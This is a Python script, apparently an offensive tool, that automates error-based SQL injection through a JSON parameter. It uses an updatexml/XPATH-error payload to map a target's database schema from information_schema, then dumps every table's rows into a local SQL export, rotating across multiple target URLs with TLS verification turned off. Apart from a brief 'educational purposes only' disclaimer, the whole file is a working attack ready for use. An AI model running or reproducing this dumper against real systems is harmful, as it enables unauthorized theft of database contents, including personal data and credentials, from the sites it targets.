
"""
DISCLAIMER:
This tool is intended for educational purposes only.
Use only in authorized environments.
Unauthorized use of this tool may be illegal.
"""

import asyncio
import httpx
import re
import argparse
import random
import os
from itertools import cycle

class UniversalSQLiDumper:
    def __init__(self, urls, target_id, max_concurrency=7, batch_size=15, timeout=25):
        self.endpoints = cycle(urls)
        self.target_id = target_id
        self.timeout = timeout
        self.batch_size = batch_size
        self.semaphore = asyncio.Semaphore(max_concurrency)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Security-Audit/2.2",
            "Content-Type": "application/json"
        }

    async def _fetch(self, client, payload, retries=3):
        target_url = next(self.endpoints)
        for _ in range(retries):
            async with self.semaphore:
                try:
                    injection = f"x', (updatexml(1,concat(0x7e,(SELECT {payload}),0x7e),1))) -- -"
                    response = await client.post(
                        target_url,
                        json={"pagina": injection, "id": self.target_id},
                        timeout=self.timeout,
                        headers=self.headers
                    )
                    match = re.search(r"XPATH syntax error: '~([^~]*)~'", response.text)
                    if match: return match.group(1)
                    return None
                except Exception:
                    await asyncio.sleep(random.uniform(0.5, 1.5))
        return None

    def _sql_safe(self, val, dtype):
        if val is None or val.lower() == 'null': return "NULL"
        if any(t in dtype.lower() for t in ['int', 'float', 'decimal']):
            clean_num = "".join(c for c in val if c in "0123456789.-")
            return clean_num if clean_num else "NULL"
        return f"'{val.replace(\"'\", \"''\")}'"

    async def dump_table(self, client, db, table, columns, f):
        print(f"\n" + "="*80)
        print(f"[*] ACTIVE EXTRACTION: {db}.{table}")
        print("="*80)
        
        col_names = [c['name'] for c in columns]
        header = " | ".join(f"{name.upper():<20}" for name in col_names)
        print(header)
        print("-" * len(header))

        query_base = f"CONCAT_WS(0x7c, {', '.join(col_names)}) FROM {db}.{table}"
        offset = 0

        while True:
            tasks = [self._fetch(client, f"{query_base} LIMIT {offset + i},1") 
                     for i in range(self.batch_size)]
            results = await asyncio.gather(*tasks)
            valid_rows = [r for r in results if r is not None]

            for row in valid_rows:
                parts = row.split('|')
                vals_sql = [self._sql_safe(parts[i] if i < len(parts) else "NULL", columns[i]['type']) 
                            for i in range(len(columns))]
                f.write(f"INSERT INTO `{table}` VALUES ({', '.join(vals_sql)});\n")
                
                console_row = " | ".join(f"{str(parts[i])[:19]:<20}" if i < len(parts) else "NULL                " 
                                        for i in range(len(col_names)))
                print(console_row)
                offset += 1

            if len(valid_rows) > 0:
                f.flush()
            
            if len(valid_rows) < self.batch_size:
                print("-" * len(header))
                print(f"[OK] {table} completed. Total rows: {offset}")
                break

    async def get_db_structure(self, client, db_name):
        print(f"\n[!] Mapping Schema: {db_name}...")
        db_hex = db_name.encode().hex()
        structure = {}
        t_idx = 0
        while True:
            t_name = await self._fetch(client, f"table_name FROM information_schema.tables WHERE table_schema=0x{db_hex} LIMIT {t_idx},1")
            if not t_name: break
            
            print(f"    [+] Detected: {t_name}")
            t_hex = t_name.encode().hex()
            cols = []
            c_idx = 0
            while True:
                c_data = await self._fetch(client, f"CONCAT(column_name,0x7c,data_type) FROM information_schema.columns WHERE table_schema=0x{db_hex} AND table_name=0x{t_hex} LIMIT {c_idx},1")
                if not c_data or '|' not in c_data: break
                name, dtype = c_data.split('|')
                cols.append({'name': name, 'type': dtype})
                c_idx += 1
            
            structure[t_name] = cols
            t_idx += 1
        return structure

    async def start_audit(self, db_name):
        async with httpx.AsyncClient(verify=False) as client:
            struct = await self.get_db_structure(client, db_name)
            output_file = f"EXPORT_{db_name}.sql"
            
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"CREATE DATABASE IF NOT EXISTS `{db_name}`;\nUSE `{db_name}`;\n")
                
                for table, columns in struct.items():
                    f.write(f"\nDROP TABLE IF EXISTS `{table}`;\nCREATE TABLE `{table}` (\n")
                    f.write(",\n".join([f"  `{c['name']}` TEXT" for c in columns]) + "\n) ENGINE=InnoDB;\n")
                    await self.dump_table(client, db_name, table, columns, f)

        print(f"\n\n[PROCESS COMPLETED]")
        print(f"-> Log generated at: {os.path.abspath(output_file)}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal Asynchronous SQLi Dumper")
    parser.add_argument("-u", "--urls", required=True)
    parser.add_argument("-i", "--id", type=int, required=True)
    parser.add_argument("-d", "--db", required=True)
    args = parser.parse_args()

    target_list = [u.strip() for u in args.urls.split(',')]
    dumper = UniversalSQLiDumper(target_list, args.id)
    asyncio.run(dumper.start_audit(args.db))
